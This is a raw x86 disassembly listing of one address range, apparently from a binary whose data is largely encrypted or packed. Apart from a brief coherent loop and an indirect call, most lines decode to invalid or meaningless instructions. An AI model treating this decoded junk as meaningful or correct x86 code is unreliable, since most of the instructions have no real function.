  402906:	adc    eax,0xdea0a869
  40290b:	jmp    0x1d43ca59
  402910:	cmp    DWORD PTR [edx+0x4d],edx
  402913:	jmp    0x4028c3
  402915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402916:	popf   
  402917:	(bad)  
  402919:	das    
  40291a:	xchg   esp,eax
  40291b:	icebp  
  40291c:	xor    dl,BYTE PTR [ebx+0x2]
  40291f:	test   DWORD PTR [ecx-0x25d34960],ebp
  402925:	push   0xffffffc3
  402927:	jne    0x402985
  402929:	adc    ah,BYTE PTR ds:0xaccf835c
  40292f:	push   ebp
  402930:	jae    0x4028df
  402932:	pop    ebx
  402933:	fldenv [ecx-0x29]
  402936:	add    al,0xca
  402938:	pop    ecx
  402939:	jecxz  0x402929
  40293b:	aam    0x71
  40293d:	aaa    
  40293e:	adc    ebx,esp
  402940:	shr    DWORD PTR [esi+ebp*8-0x739e9ba9],cl
  402947:	cmp    edi,edx
  402949:	mov    DWORD PTR ds:0x434392,0x545f
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432dde,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43439e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43439e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43439e,edi
  402989:	cmp    DWORD PTR ds:0x43439e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43439e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x43437e
  4029ab:	push   0x4692
  4029b0:	push   0x432738
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432cea
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432de6,0x432dbe
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x43436a,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi-0x3ee3ee04],ah
  402a13:	enter  0x12,0xc
  402a17:	jo     0x402a89
  402a19:	xchg   edi,eax
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x402a4b
  402a1e:	cmp    eax,0x53b604b6
  402a23:	pop    edx
  402a24:	xchg   ebx,ecx
  402a26:	sub    al,0x1e
  402a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a29:	fadd   DWORD PTR [esp+ebp*1]
  402a2c:	in     al,dx
  402a2d:	gs popf 
  402a2f:	ret    
  402a30:	loop   0x402a22
  402a32:	sti    
  402a33:	in     eax,0x3d
  402a35:	(bad)  
  402a36:	xor    eax,0xb8804f64
  402a3b:	enter  0x341c,0x4b
  402a3f:	inc    esi
  402a40:	sub    bl,ch
  402a42:	jmp    0xe71ab50
  402a47:	out    dx,eax
  402a48:	pop    ecx
  402a49:	je     0x402a7c
  402a4b:	ins    BYTE PTR es:[edi],dx
  402a4c:	std    
  402a4d:	lahf   
  402a4e:	lock aas 
  402a50:	xchg   ecx,eax
  402a51:	icebp  
  402a52:	add    al,0x98
  402a54:	dec    esp
  402a55:	shl    DWORD PTR [ecx],1
  402a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a58:	fistp  WORD PTR gs:[edi]
  402a5b:	sahf   
  402a5c:	or     al,0x9a
  402a5e:	inc    ecx
  402a5f:	and    edx,ecx
  402a61:	add    ch,dl
  402a63:	in     al,0x47
  402a65:	stos   DWORD PTR es:[edi],eax
  402a66:	add    BYTE PTR [ebp-0x13285d45],al
  402a6c:	out    dx,eax
  402a6d:	(bad)
  402a72:	sub    DWORD PTR [esi],edi
  402a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a75:	div    ebp
  402a77:	inc    ecx
  402a78:	aas    
  402a79:	loop   0x402a94
  402a7b:	lock call 0x7983:0x41082135
  402a83:	call   0xba34:0xa974839
  402a8a:	sbb    al,0x7c
  402a8c:	pop    es
  402a8d:	jno    0x402a3d
  402a8f:	cmp    dh,BYTE PTR [edx-0x2d5d70de]
  402a95:	push   ebx
  402a96:	ds pop esi
  402a98:	dec    ebx
  402a99:	gs dec ecx
  402a9b:	mov    esp,0xe686208b
  402aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402aa1:	add    ecx,DWORD PTR [ecx]
  402aa3:	push   ds
  402aa4:	mov    WORD PTR [ecx],fs
  402aa6:	cmp    al,0x49
  402aa8:	dec    ecx
  402aa9:	jmp    0x6654:0xd7153d5b
  402ab0:	loopne 0x402ab1
  402ab2:	mov    ebp,0x178e8bf9
  402ab7:	mov    bl,0x6a
  402ab9:	dec    esi
  402aba:	ficomp WORD PTR [ecx+edx*2]
  402abd:	(bad)  
  402abe:	jmp    0xb8a5:0xc54de250
  402ac5:	addr16 mov eax,0x50a8a6f0
  402acb:	pop    ss
  402acc:	xor    al,0xa8
  402ace:	scas   eax,DWORD PTR es:[edi]
  402acf:	adc    eax,0x35166e05
  402ad4:	mov    eax,0x8f9d6369
  402ad9:	sub    al,0xa
  402adb:	enter  0xfafe,0xb9
  402adf:	pop    ebp
  402ae0:	sti    
  402ae1:	pusha  
  402ae2:	out    dx,eax
  402ae3:	xor    DWORD PTR [esi+0x16787913],esi
  402ae9:	add    edx,DWORD PTR [edi+0x58]
  402aec:	mov    ds:0xdb9801fe,eax
  402af1:	bound  esp,QWORD PTR [edi]
  402af3:	stos   BYTE PTR es:[edi],al
  402af4:	pop    ds
  402af5:	in     eax,dx
  402af6:	cs aad 0xba
  402af9:	mov    dh,0x4a
  402afb:	mov    edi,0x381bfd81
  402b00:	je     0x402b1d
  402b02:	adc    esp,DWORD PTR [ebp-0x491566eb]
  402b08:	or     al,0x4e
  402b0a:	inc    esi
  402b0b:	sbb    bl,bl
  402b0d:	mov    esp,0x7ba4295e
  402b12:	cli    
  402b13:	lock (bad) 
  402b15:	xchg   esp,eax
  402b16:	cmp    eax,ebx
  402b18:	fdiv   DWORD PTR [ecx+0x47]
  402b1b:	sbb    DWORD PTR [ecx],eax
  402b1d:	outs   dx,DWORD PTR ds:[esi]
  402b1e:	inc    ecx
  402b1f:	cdq    
  402b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b21:	test   DWORD PTR cs:[edi-0x28],edi
  402b25:	sub    ch,BYTE PTR [edi+0x39e40bd1]
  402b2b:	ss stc 
  402b2d:	out    dx,al
  402b2e:	das    
  402b2f:	ins    DWORD PTR es:[edi],dx
  402b30:	aad    0xb7
  402b32:	popa   
  402b33:	xor    eax,0xcecea089
  402b38:	jmp    0x402b64
  402b3a:	loopne 0x402b62
  402b3c:	xlat   BYTE PTR ds:[ebx]
  402b3d:	daa    
  402b3e:	dec    eax
  402b3f:	dec    esp
  402b40:	push   0x378f17d4
  402b45:	xchg   ebx,eax
  402b46:	jge    0x402b44
  402b48:	push   ebx
  402b49:	jae    0x402b32
  402b4b:	add    eax,0xbcf2e30d
  402b50:	adc    al,0x30
  402b52:	test   eax,0xe2ae2f59
  402b57:	loope  0x402b68
  402b59:	int    0xfe
  402b5b:	hlt    
  402b5c:	mov    eax,0xf4ab580d
  402b61:	addr16 xchg esi,eax
  402b63:	push   ss
  402b64:	mov    bl,0xc2
  402b66:	(bad)  
  402b67:	aas    
  402b68:	lds    eax,FWORD PTR [edi]
  402b6a:	retf   0xeed1
  402b6d:	pop    edx
  402b6e:	mov    eax,0xb7add8c4
  402b73:	mov    dl,0xed
  402b75:	enter  0xdbc9,0xcb
  402b79:	dec    eax
  402b7a:	out    dx,al
  402b7b:	sti    
  402b7c:	jmp    0xdd69:0xa2324dc9
  402b83:	pop    ebx
  402b84:	out    0x6a,eax
  402b86:	cs aad 0xd
  402b89:	jns    0x402bf7
  402b8b:	dec    edx
  402b8c:	cdq    
  402b8d:	push   eax
  402b8e:	xlat   BYTE PTR ds:[ebx]
  402b8f:	outs   dx,BYTE PTR ds:[esi]
  402b90:	out    0x9b,eax
  402b92:	fs cli 
  402b94:	mov    ds,eax
  402b96:	inc    edx
  402b97:	scas   eax,DWORD PTR es:[edi]
  402b98:	inc    esi
  402b99:	(bad)  
  402b9a:	(bad)  
  402b9c:	or     DWORD PTR [eax-0x40bd9cd4],ebx
  402ba2:	test   al,0xe1
  402ba4:	pop    eax
  402ba5:	lock adc bh,BYTE PTR [ebx-0x55]
  402ba9:	adc    BYTE PTR [esi],cl
  402bab:	mov    esp,0x6b9bd198
  402bb0:	dec    eax
  402bb1:	xchg   ebx,eax
  402bb2:	mov    eax,0x4d2a8094
  402bb7:	das    
  402bb8:	or     eax,0xd34635e8
  402bbd:	jg     0x402b79
  402bbf:	mov    ds:0xb27ded9f,eax
  402bc4:	out    dx,al
  402bc5:	lock (bad) 
  402bc7:	lds    eax,FWORD PTR [edi]
  402bc9:	call   0x2095:0x7a6465c9
  402bd0:	pop    ds
  402bd1:	xchg   ecx,eax
  402bd2:	enter  0x7284,0x39
  402bd6:	mov    bh,0xf1
  402bd8:	in     eax,dx
  402bd9:	es data16 fstp st(6)
  402bdd:	out    dx,al
  402bde:	fcomp  QWORD PTR [ebp-0x50d48af8]
  402be4:	mov    al,ds:0x11500e58
  402be9:	call   0x76a8dba1
  402bee:	out    dx,eax
  402bef:	dec    ebx
  402bf0:	sub    DWORD PTR [ecx+0x36],edi
  402bf3:	nop
  402bf4:	push   ebx
  402bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bf6:	out    0xb2,al
  402bf8:	ja     0x402c66
  402bfa:	inc    edx
  402bfb:	dec    esp
  402bfc:	shr    BYTE PTR [ebx],cl
  402bfe:	iret   
  402bff:	mov    esi,gs
  402c01:	add    ecx,ecx
  402c03:	lea    ecx,ds:0x58d23bcf
  402c09:	jmp    0x4fc6a91c
  402c0e:	sbb    ah,BYTE PTR [edx-0x5dc0a6f7]
  402c14:	in     eax,0x64
  402c16:	retf   0xc555
  402c19:	(bad)
  402c1c:	mov    ecx,0xd19fdc4f
  402c21:	popa   
  402c22:	outs   dx,BYTE PTR ds:[esi]
  402c23:	inc    esp
  402c24:	call   0xcb7eb43d
  402c29:	inc    ebx
  402c2a:	inc    eax
  402c2b:	push   edx
  402c2c:	imul   edi,DWORD PTR [edx-0x3f],0xb6854020
  402c33:	mov    ecx,edi
  402c35:	fstp   TBYTE PTR [esi+0x5de86ff6]
  402c3b:	inc    ebp
  402c3c:	cwde   
  402c3d:	mov    eax,ds:0xabb7d313
  402c42:	leave  
  402c43:	and    ch,BYTE PTR [eax-0x5415c234]
  402c49:	imul   ebx,DWORD PTR [ebx],0x73
  402c4c:	popa   
  402c4d:	sub    edi,ebp
  402c4f:	cmp    al,0x71
  402c51:	and    ah,dl
  402c53:	mov    ebx,0xca000cac
  402c58:	jle    0x402c14
  402c5a:	xchg   esp,eax
  402c5b:	in     al,dx
  402c5c:	fistp  QWORD PTR [ebx]
  402c5e:	jmp    0x7475:0xda304f0c
  402c65:	sub    DWORD PTR [ebp+0x59],ebx
  402c68:	push   ss
  402c69:	inc    edx
  402c6a:	jle    0x402c12
  402c6c:	stos   DWORD PTR es:[edi],eax
  402c6d:	add    al,0x78
  402c6f:	dec    edi
  402c70:	or     al,0xbc
  402c72:	push   cs
  402c73:	mov    eax,0x9375a536
  402c78:	stc    
  402c79:	mov    edi,0xa60ae813
  402c7e:	dec    edi
  402c7f:	push   ecx
  402c80:	stc    
  402c81:	ins    DWORD PTR es:[edi],dx
  402c82:	sbb    eax,eax
  402c84:	mov    DWORD PTR [eax],edx
  402c86:	cmp    eax,0xcf1157e1
  402c8b:	jp     0x402c38
  402c8d:	div    DWORD PTR [ecx-0x1ee7382c]
  402c93:	or     al,0xdb
  402c95:	inc    esi
  402c96:	xor    ch,BYTE PTR [edi]
  402c98:	sub    esi,DWORD PTR [ebx-0x49598f8c]
  402c9e:	ja     0x402c6c
  402ca0:	jns    0x402d20
  402ca2:	dec    DWORD PTR [edx+edi*8-0x4d245c99]
  402ca9:	call   0xc02f:0x9dc3b9a5
  402cb0:	out    dx,eax
  402cb1:	and    edi,esp
  402cb3:	xor    ecx,ecx
  402cb5:	scas   eax,DWORD PTR es:[edi]
  402cb6:	push   0x23
  402cb8:	cld    
  402cb9:	mov    ecx,DWORD PTR [ebx]
  402cbb:	dec    ebx
  402cbc:	adc    ebp,DWORD PTR [ebx]
  402cbe:	fwait
  402cbf:	xchg   esp,eax
  402cc0:	rcr    BYTE PTR [edi],0x8
  402cc3:	loope  0x402c63
  402cc5:	push   esp
  402cc6:	cmp    esp,DWORD PTR [ecx-0x17]
  402cc9:	stos   DWORD PTR es:[edi],eax
  402cca:	out    0xd7,al
  402ccc:	adc    al,0x63
  402cce:	cmp    bl,BYTE PTR [esi]
  402cd0:	mov    eax,0x4d8c2bd5
  402cd5:	adc    dl,BYTE PTR [edx+esi*4]
  402cd8:	scas   eax,DWORD PTR es:[edi]
  402cd9:	inc    ebx
  402cda:	sub    esi,esi
  402cdc:	daa    
  402cdd:	lods   eax,DWORD PTR ds:[esi]
  402cde:	xchg   esi,eax
  402cdf:	inc    eax
  402ce0:	lock jbe 0x402d09
  402ce3:	(bad)  
  402ce4:	xchg   esi,eax
  402ce5:	push   esi
  402ce6:	imul   esp,DWORD PTR [esi],0xdd4109bd
  402cec:	loopne 0x402c9e
  402cee:	inc    ebp
  402cef:	inc    edi
  402cf0:	sub    BYTE PTR [esi],0x1d
  402cf3:	xor    DWORD PTR [esi-0x1a],esp
  402cf6:	mov    BYTE PTR [esi],ah
  402cf8:	jnp    0x402d17
  402cfa:	sahf   
  402cfb:	in     al,dx
  402cfc:	outs   dx,BYTE PTR ds:[esi]
  402cfd:	push   esp
  402cfe:	gs push edi
  402d00:	ss pop esi
  402d02:	jmp    0x6860:0x173669de
  402d09:	out    0xf9,eax
  402d0b:	pushf  
  402d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d0d:	test   bh,bh
  402d0f:	pop    eax
  402d10:	retf   0x5b66
  402d13:	je     0x402d67
  402d15:	xchg   esi,eax
  402d16:	adc    al,0x4f
  402d18:	jle    0x402cd3
  402d1a:	add    bl,BYTE PTR [esi]
  402d1c:	test   DWORD PTR ds:0xfafa19ad,esp
  402d22:	jne    0x402d4d
  402d24:	addr16 push esp
  402d26:	mov    ebp,0x26a3a502
  402d2b:	pop    esp
  402d2c:	adc    edx,DWORD PTR [ecx-0x13]
  402d2f:	sbb    BYTE PTR [ecx+0x2b9231d7],ch
  402d35:	adc    ebx,DWORD PTR [esi+eax*8+0x242cd239]
  402d3c:	jecxz  0x402d12
  402d3e:	dec    ecx
  402d3f:	xor    DWORD PTR [ecx],0x26
  402d42:	js     0x402d60
  402d44:	aas    
  402d45:	pop    ebp
  402d46:	push   ebp
  402d47:	sub    cl,BYTE PTR [edx-0x9e67fb8]
  402d4d:	adc    ecx,ecx
  402d4f:	in     al,0x81
  402d51:	aam    0x34
  402d53:	xchg   edi,eax
  402d54:	into   
  402d55:	push   edi
  402d56:	mov    WORD PTR [ebp+0x7a],cs
  402d59:	mov    al,ds:0x9e3492df
  402d5e:	cmp    ecx,0xb054e669
  402d64:	outs   dx,DWORD PTR ds:[esi]
  402d65:	js     0x402d06
  402d67:	add    eax,DWORD PTR [ebx]
  402d69:	adc    BYTE PTR [ecx+0x44],ch
  402d6c:	cmp    al,0x35
  402d6e:	cmp    al,0xb3
  402d70:	push   edi
  402d71:	jo     0x402d97
  402d73:	xchg   DWORD PTR [eax-0x47],edi
  402d76:	xor    ebp,DWORD PTR [eax*2+0x45ea97c0]
  402d7d:	ja     0x402daa
  402d7f:	adc    DWORD PTR [esi-0x5a668e9f],ecx
  402d85:	call   DWORD PTR [eax+0x2a]
  402d88:	retf   0x94f9
  402d8b:	push   esp
  402d8c:	pop    ecx
  402d8d:	pop    edi
  402d8e:	pop    ebp
  402d8f:	into   
  402d90:	fucompp 
  402d92:	mov    edx,0xdbf0eb0
  402d97:	push   ebx
  402d98:	fild   QWORD PTR [edx+ebx*4+0x79330b91]
  402d9f:	shr    BYTE PTR [esi+0x76666c07],1
  402da5:	lods   eax,DWORD PTR gs:[esi]
  402da7:	sbb    ah,BYTE PTR [edx]
  402da9:	sti    
  402daa:	nop
  402dab:	adc    BYTE PTR [edi*2-0x3b1632eb],al
  402db2:	fild   WORD PTR [edi-0x75]
  402db5:	icebp  
  402db6:	mov    edi,DWORD PTR [ebp-0x4]
  402db9:	jmp    0x40316f
  402dbe:	cs out dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	and    al,0xf3
  402dcc:	adc    DWORD PTR [edi+eiz*4],esp
  402dcf:	or     DWORD PTR [eax+0x70],esi
  402dd2:	xchg   edi,eax
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402e3d
  402dd7:	sti    
  402dd8:	push   ss
  402dd9:	mov    esp,0xeaf7720e
  402dde:	(bad)  
  402ddf:	or     DWORD PTR [edi+0x2d5f54a5],ecx
  402de5:	ret    0x3d21
  402de8:	pusha  
  402de9:	(bad)  
  402dea:	xchg   ebp,eax
  402deb:	and    BYTE PTR [edi],al
  402ded:	retf   
  402dee:	cli    
  402def:	rcl    DWORD PTR [ebx-0x27],1
  402df2:	repz (bad) 
  402df4:	cmp    esp,DWORD PTR [ebp+0x49]
  402df7:	inc    esi
  402df8:	pop    es
  402df9:	stos   BYTE PTR es:[edi],al
  402dfa:	popf   
  402dfb:	into   
  402dfc:	outs   dx,DWORD PTR ds:[esi]
  402dfd:	mov    ds:0x432f7b3a,al
  402e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e03:	push   esp
  402e04:	sbb    DWORD PTR [eax-0x6a],edx
  402e07:	jns    0x402de2
  402e09:	add    BYTE PTR [eax+0x3287190c],dh
  402e0f:	jmp    0x2bfbbd83
  402e14:	push   ds
  402e15:	xor    dl,ah
  402e17:	mov    ds:0x33185fc6,eax
  402e1c:	jge    0x402e18
  402e1e:	jno    0x402e66
  402e20:	(bad)  
  402e21:	jns    0x402dc9
  402e23:	xor    al,0x9d
  402e25:	push   cs
  402e26:	iret   
  402e27:	xchg   ebp,eax
  402e28:	xor    DWORD PTR ds:[edx+0x1a8fdbca],esp
  402e2f:	call   0x9721e611
  402e34:	inc    esi
  402e35:	mov    ds:0x72144e87,al
  402e3a:	popa   
  402e3b:	push   cs
  402e3c:	xchg   ebp,eax
  402e3d:	fadd   QWORD PTR [ebx-0x5ee868e9]
  402e43:	jno    0x402e62
  402e45:	cmp    eax,0x1484fc39
  402e4a:	add    cl,BYTE PTR [ecx-0x473f4f19]
  402e50:	mov    dl,al
  402e52:	fs xchg edi,eax
  402e54:	cs sti 
  402e56:	mov    ebp,0x75f64362
  402e5b:	mov    ebp,0xa9a6cacd
  402e60:	jl     0x402e86
  402e62:	sub    al,0xc7
  402e64:	inc    esi
  402e65:	pop    esi
  402e66:	pop    ebp
  402e67:	loop   0x402e37
  402e69:	xor    al,BYTE PTR [ecx-0x44]
  402e6c:	xor    DWORD PTR es:[eax],esp
  402e6f:	test   bl,ah
  402e71:	jle    0x402e8c
  402e73:	clc    
  402e74:	cmp    eax,eax
  402e76:	xor    BYTE PTR [edx+0x7dea71bb],al
  402e7c:	jle    0x402e6f
  402e7e:	outs   dx,DWORD PTR ds:[esi]
  402e7f:	push   es
  402e80:	mov    ch,0x11
  402e82:	hlt    
  402e83:	cmp    esp,edi
  402e85:	mov    ebp,0xce2a0bd1
  402e8a:	jne    0x402ec7
  402e8c:	repz das 
  402e8e:	xor    al,0xb3
  402e90:	pop    esi
  402e91:	repnz or al,0x22
  402e94:	(bad)  
  402e95:	or     DWORD PTR [eax],ebx
  402e97:	dec    ebx
  402e98:	(bad)  
  402e99:	in     al,0xed
  402e9b:	mov    ds:0xe4b8015c,al
  402ea0:	inc    edx
  402ea1:	jmp    0x402ef4
  402ea3:	jo     0x402e75
  402ea5:	sub    ah,ah
  402ea7:	sbb    ebx,DWORD PTR [ebx+eax*8+0x4357d471]
  402eae:	or     dl,BYTE PTR [esi+0x8]
  402eb1:	mov    dh,0x4c
  402eb3:	add    DWORD PTR [edx+0x42],esi
  402eb6:	xor    BYTE PTR [ecx+0x5bf9ce86],0x5f
  402ebd:	mov    ecx,0x8d3e2e62
  402ec2:	sub    BYTE PTR ds:0xe9adfe1,dl
  402ec8:	out    dx,al
  402ec9:	rol    ch,cl
  402ecb:	sub    al,0x73
  402ecd:	dec    eax
  402ece:	lods   al,BYTE PTR ds:[esi]
  402ecf:	mov    dh,0x43
  402ed1:	int3   
  402ed2:	cmp    BYTE PTR [ebx-0x5d],al
  402ed5:	lods   al,BYTE PTR ds:[esi]
  402ed6:	popa   
  402ed7:	je     0x402e84
  402ed9:	sbb    dh,dl
  402edb:	int3   
  402edc:	jae    0x402f1b
  402ede:	adc    edi,0x62bb8d44
  402ee4:	push   esp
  402ee5:	add    DWORD PTR [ebp+0x3490a1a4],esi
  402eeb:	int    0x4a
  402eed:	je     0x402ecd
  402eef:	test   DWORD PTR fs:[ebp+0x6b],ebx
  402ef3:	in     eax,0x63
  402ef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ef6:	and    DWORD PTR [ecx+esi*4-0x2b0a39ac],ecx
  402efd:	je     0x402ed4
  402eff:	push   ebx
  402f00:	inc    eax
  402f01:	ss cmp edi,ebp
  402f04:	jg     0x402eb0
  402f06:	push   edi
  402f07:	jle    0x402ece
  402f09:	and    eax,0xda81d0da
  402f0e:	repz inc esi
  402f10:	call   0x8ba478fd
  402f15:	adc    al,0xe2
  402f17:	repz in al,0x56
  402f1a:	push   ecx
  402f1b:	repnz dec ebx
  402f1d:	add    BYTE PTR [esi+0x45b5d07b],ah
  402f23:	pop    esi
  402f24:	sbb    esi,DWORD PTR [ebx]
  402f26:	mov    esi,0x6ea564ea
  402f2b:	cmc    
  402f2c:	add    DWORD PTR [eax-0x1d22001],ecx
  402f32:	not    esi
  402f34:	in     eax,0xdf
  402f36:	sbb    eax,0x84cc6084
  402f3b:	fwait
  402f3c:	enter  0x548f,0xb1
  402f40:	clc    
  402f41:	nop
  402f42:	out    0x75,eax
  402f44:	test   DWORD PTR [edi+esi*4+0x5d],ebp
  402f48:	hlt    
  402f49:	xchg   ebp,eax
  402f4a:	mov    BYTE PTR [ebp-0x59],al
  402f4d:	mov    ds:0x2863713,eax
  402f52:	mov    DWORD PTR [ebp+0x288a154d],ebp
  402f58:	or     esi,eax
  402f5a:	xchg   ebx,eax
  402f5b:	pop    es
  402f5c:	ret    
  402f5d:	sub    eax,0x12c6baaf
  402f62:	test   eax,0xcddb8c86
  402f67:	mov    ebx,0xed0b3efa
  402f6c:	cwde   
  402f6d:	cdq    
  402f6e:	sub    DWORD PTR [ecx-0x6f],eax
  402f71:	mov    ah,0x2b
  402f73:	cmp    DWORD PTR [edx-0x145d2f86],edx
  402f79:	mov    esp,0x5e12a8eb
  402f7e:	mov    esi,0x5050256b
  402f83:	xor    eax,0x85c06916
  402f88:	xchg   ebx,eax
  402f89:	ss add al,0x1b
  402f8c:	jnp    0x402f27
  402f8e:	cmp    DWORD PTR gs:[ebx+eiz*1],edi
  402f92:	and    eax,0x8d3a3e52
  402f97:	mov    dh,0x5f
  402f99:	(bad)
  402f9d:	jge    0x402fe8
  402f9f:	loop   0x402f2a
  402fa1:	xor    edx,DWORD PTR [edx]
  402fa3:	jmp    0xebfa25d5
  402fa8:	arpl   sp,si
  402faa:	fs dec edi
  402fac:	mov    ch,0x9a
  402fae:	sub    edi,DWORD PTR [ecx+ecx*1]
  402fb1:	in     eax,0xc2
  402fb3:	jbe    0x403021
  402fb5:	pop    ds
  402fb6:	xchg   edi,eax
  402fb7:	dec    cl
  402fb9:	inc    edx
  402fba:	cmp    eax,0xa88dc996
  402fbf:	(bad)  
  402fc0:	mov    esp,0x5ff503e2
  402fc5:	pop    esi
  402fc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fc7:	mov    BYTE PTR [eax+esi*4-0x55449871],bl
  402fce:	test   ebp,ecx
  402fd0:	xchg   edi,eax
  402fd1:	into   
  402fd2:	inc    ecx
  402fd3:	cdq    
  402fd4:	jo     0x402fc1
  402fd6:	xor    DWORD PTR [esi-0x24],ebx
  402fd9:	retf   
  402fda:	xor    al,0x73
  402fdc:	jns    0x402fa9
  402fde:	test   ebx,edx
  402fe0:	aas    
  402fe1:	int    0x84
  402fe3:	in     al,0xb5
  402fe5:	sub    al,0xc0
  402fe7:	pop    ebx
  402fe8:	scas   al,BYTE PTR es:[edi]
  402fe9:	ins    BYTE PTR es:[edi],dx
  402fea:	ret    
  402feb:	pop    esp
  402fec:	xchg   ebx,eax
  402fed:	mov    eax,ds:0xfd9e376
  402ff2:	aad    0x7
  402ff4:	add    ecx,DWORD PTR [edx-0x71]
  402ff7:	icebp  
  402ff8:	cmp    DWORD PTR [edi],ebx
  402ffa:	cmp    ecx,DWORD PTR [ebx]
  402ffc:	(bad)  
  402ffd:	retf   0x2298
  403000:	jmp    0x403017
  403002:	jno    0x402f8d
  403004:	pop    eax
  403005:	dec    esp
  403006:	inc    esp
  403007:	out    0x1c,eax
  403009:	aas    
  40300a:	cdq    
  40300b:	jbe    0x402fdd
  40300d:	adc    DWORD PTR [edx+0x1a],esi
  403010:	pop    eax
  403011:	(bad)  
  403012:	aaa    
  403013:	arpl   di,di
  403015:	and    al,0xa1
  403017:	(bad)  
  403018:	cwde   
  403019:	mov    ch,0x52
  40301b:	sbb    BYTE PTR [ebp-0x7b],bh
  40301e:	pop    ebx
  40301f:	in     eax,0x70
  403021:	(bad)  
  403023:	adc    ebx,edx
  403025:	inc    esp
  403026:	pop    ecx
  403027:	inc    esi
  403028:	mov    ebp,eax
  40302a:	scas   eax,DWORD PTR es:[edi]
  40302b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40302c:	push   eax
  40302d:	push   0x64acd2c0
  403032:	xor    eax,0xa5e50535
  403037:	inc    ebx
  403038:	fistp  WORD PTR [edi]
  40303a:	dec    esp
  40303b:	add    al,0x17
  40303d:	xchg   esi,eax
  40303e:	push   0xffffffaf
  403040:	cmp    al,0xc1
  403042:	jle    0x403097
  403044:	ins    DWORD PTR es:[edi],dx
  403045:	push   edi
  403046:	pusha  
  403047:	mov    al,ds:0x7dc007d4
  40304c:	shl    DWORD PTR [ebx],1
  40304e:	pop    eax
  40304f:	jne    0x402ff9
  403051:	dec    esi
  403052:	sbb    eax,0xffadb67b
  403057:	xchg   edi,eax
  403058:	leave  
  403059:	cdq    
  40305a:	ror    DWORD PTR [ebx-0x72],0x66
  40305e:	pop    edi
  40305f:	add    BYTE PTR [edx-0x12e59710],dl
  403065:	fmul   DWORD PTR [eax]
  403067:	adc    edi,DWORD PTR [edi-0x52e2aa7b]
  40306d:	sbb    DWORD PTR [esi],ebp
  40306f:	lea    esi,[edi+0x70c823b6]
  403075:	push   es
  403076:	gs or  eax,0x337ae0fb
  40307c:	dec    eax
  40307d:	xchg   esi,eax
  40307e:	clc    
  40307f:	mov    esi,0xa729926b
  403084:	cs inc edx
  403086:	jnp    0x40301f
  403088:	xchg   DWORD PTR [esp+edi*2-0x7bf719d0],ecx
  40308f:	xchg   esp,eax
  403090:	inc    ebx
  403092:	lods   al,BYTE PTR ds:[esi]
  403093:	shr    DWORD PTR [eiz*4-0x6c405b85],0x4e
  40309b:	inc    esi
  40309c:	cmp    ecx,DWORD PTR [ecx]
  40309e:	push   0x31dee477
  4030a3:	mov    edi,0x377b548
  4030a8:	xchg   ecx,eax
  4030a9:	jnp    0x403096
  4030ab:	add    edi,ebx
  4030ad:	cmp    DWORD PTR [ebp-0x50],0xffffffd2
  4030b1:	push   ebx
  4030b2:	add    ecx,esp
  4030b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030b5:	pop    ebx
  4030b6:	pop    ecx
  4030b7:	loope  0x403043
  4030b9:	cmp    esi,ecx
  4030bb:	mov    BYTE PTR [esi],al
  4030bd:	dec    esi
  4030be:	test   DWORD PTR [eax+ebx*4+0xe05e506],edx
  4030c5:	clc    
  4030c6:	jno    0x40306b
  4030c8:	(bad)
  4030cc:	push   es
  4030cd:	shl    BYTE PTR [eax+esi*1-0x7],1
  4030d1:	sbb    DWORD PTR [ecx],esi
  4030d3:	or     eax,0x756e411
  4030d8:	and    dh,BYTE PTR [esi]
  4030da:	cmp    edi,DWORD PTR [ebx]
  4030dc:	outs   dx,BYTE PTR ds:[esi]
  4030dd:	and    BYTE PTR [edx+eiz*2],ah
  4030e0:	add    al,BYTE PTR [edi*4-0x1f521303]
  4030e7:	cs pop edx
  4030e9:	cmp    ebp,ebx
  4030eb:	jge    0x403099
  4030ed:	hlt    
  4030ee:	jge    0x403102
  4030f0:	fld    DWORD PTR [ecx]
  4030f2:	jp     0x403104
  4030f4:	neg    BYTE PTR [ebx+edi*8]
  4030f7:	stc    
  4030f8:	mov    dh,BYTE PTR [edi]
